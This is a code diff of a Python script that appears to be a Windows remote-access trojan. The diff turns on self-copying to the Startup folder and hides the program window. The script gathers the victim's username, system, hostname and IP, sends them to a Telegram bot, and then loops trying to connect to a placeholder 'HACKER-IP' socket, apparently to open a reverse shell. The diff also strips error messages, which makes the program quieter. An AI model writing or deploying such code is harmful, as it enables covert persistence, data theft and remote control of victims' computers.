@@ -2,23 +2,19 @@ import getpass, os, win32con, win32gui, datetime, platform, socket, requests, su
 
 
 username = getpass.getuser()
-# # startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username) 
-# startup = 'C:\\Users\\"{}"\\Desktop'.format(username) 
+startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username) 
 
-# if os.getcwd() != startup :
-#     try:
-#         os.system("copy {} {}" .format(__file__,startup))
-#     except:
-#         print ("copy error")
-#     exit()
+if os.getcwd() != startup :
+     try:
+         os.system("copy {} {}" .format(__file__,startup))
+     except:
+         exit()
 
-
-# try:
-#     pid = win32gui.GetForegroundWindow()
-#     win32gui.ShowWindow(pid,win32con.SW_HIDE)
-# except:
-#     print ("hide error")
-#     exit()
+try:
+     pid = win32gui.GetForegroundWindow()
+     win32gui.ShowWindow(pid,win32con.SW_HIDE)
+except:
+     exit()
 
 
 time = datetime.datetime.now()
@@ -39,7 +35,7 @@ MPTB01 WAS EXECUTED ...
 """.format(username,os,pc,ip,time)
 
 payload = {
-"UrlBox" : "https://api.telegram.org/bot5933232535:AAEmiH6TfgxItHlR9MmrSmTOOh-ONPANX8E/sendMessage?text={}&chat_id=5446661281".format(msg),
+"UrlBox" : "https://api.telegram.org/bot{TOKEN}/sendMessage?text={}&chat_id={CHAT_ID}".format(msg),
 "AgentList":"Mozilla Firefox",
 "VersionList":"HTTP/1.1",
 "MethodList":"Post"
@@ -51,7 +47,6 @@ while True:
         print ("sent message")
         break
     except:
-        print ("bot error")
         continue
 
 
@@ -59,11 +54,9 @@ while True:
     try:
         sckt = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
         sckt.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        # sckt.connect (("192.168.86.18", 60000))
         sckt.connect (("HACKER-IP", PORT))
         break
     except:
-        print ("sckt erroe")
         continue
 
 while True:
